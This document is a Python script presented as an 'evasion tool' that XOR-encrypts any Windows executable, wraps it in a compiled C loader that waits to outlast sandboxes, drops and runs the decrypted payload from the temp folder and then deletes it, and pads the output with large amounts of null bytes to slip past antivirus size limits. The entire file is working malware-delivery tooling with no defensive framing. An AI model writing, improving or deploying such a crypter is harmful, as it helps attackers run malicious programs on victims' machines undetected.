import os
import random
import argparse
import subprocess

def get_args():
    parser = argparse.ArgumentParser(description="HiddenBytes Evasion Tool")
    parser.add_argument("--encrypt", help="Target binary to encrypt")
    parser.add_argument("--output", help="Output filename", default="obfuscated.exe")
    parser.add_argument("--add-size", type=int, help="Size to add in MB (e.g. 101)")
    parser.add_argument("--delay", type=int, default=101, help="Execution delay in seconds")
    return parser.parse_args()


def xor_encrypt(data, key):
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

def builder():
    args = get_args()
    if not args.encrypt:
        print("[-] Please specify a target binary with --encrypt")
        return

    # 1. Read and encrypt the target binary
    print(f"[*] Encrypting {args.encrypt}...")
    with open(args.encrypt, "rb") as f:
        original_data = f.read()

    key = bytes(random.randint(1, 255) for _ in range(32))
    encrypted_data = xor_encrypt(original_data, key)

    # 2. Generate C loader with embedded encrypted payload
    encrypted_hex = ", ".join(f"0x{b:02x}" for b in encrypted_data)
    key_hex = ", ".join(f"0x{b:02x}" for b in key)

    loader_code = f"""
#include <windows.h>
#include <stdio.h>

unsigned char enc_data[] = {{ {encrypted_hex} }};
unsigned char xor_key[] = {{ {key_hex} }};
unsigned int data_len = {len(encrypted_data)};
unsigned int key_len = {len(key)};

int main() {{
    // Execution delay
    Sleep({args.delay * 1000});

    // Decrypt in memory
    for (unsigned int i = 0; i < data_len; i++) {{
        enc_data[i] ^= xor_key[i % key_len];
    }}

    // Write decrypted binary to temp
    char temp_path[MAX_PATH];
    char temp_file[MAX_PATH];
    GetTempPathA(MAX_PATH, temp_path);
    snprintf(temp_file, MAX_PATH, "%s\\\\hb_payload.exe", temp_path);

    FILE *f = fopen(temp_file, "wb");
    if (!f) {{ return 1; }}
    fwrite(enc_data, 1, data_len, f);
    fclose(f);

    // Execute decrypted binary
    STARTUPINFOA si = {{0}};
    PROCESS_INFORMATION pi = {{0}};
    si.cb = sizeof(si);
    CreateProcessA(temp_file, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

    // Wait for it to finish, then clean up
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    DeleteFileA(temp_file);

    return 0;
}}
"""

    # 3. Write loader source and compile
    loader_src = "loader_temp.c"
    with open(loader_src, "w") as f:
        f.write(loader_code)

    vcvars_path = r"C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\VC\\Auxiliary\\Build\\vcvars64.bat"
    compile_cmd = f'"{vcvars_path}" && cl /O2 /Fe:{args.output} {loader_src}'

    print("[*] Compiling loader...")
    result = subprocess.run(compile_cmd, capture_output=True, text=True, shell=True)

    if result.returncode != 0:
        print(f"[-] Compilation failed: {result.stderr}")
        return

    # Clean up temp build files
    for temp in [loader_src, "loader_temp.obj"]:
        if os.path.exists(temp):
            os.remove(temp)

    # 4. File Size Manipulation
    if args.add_size:
        print(f"[*] Inflating file by {args.add_size}MB...")
        padding = b"\x00" * (1024 * 1024 * args.add_size)
        with open(args.output, "ab") as f:
            f.write(padding)

    print(f"[+] Success! {args.output} generated.")
    print(f"[+] Final Size: {os.path.getsize(args.output) / (1024*1024):.2f} MB")

if __name__ == "__main__":
    builder()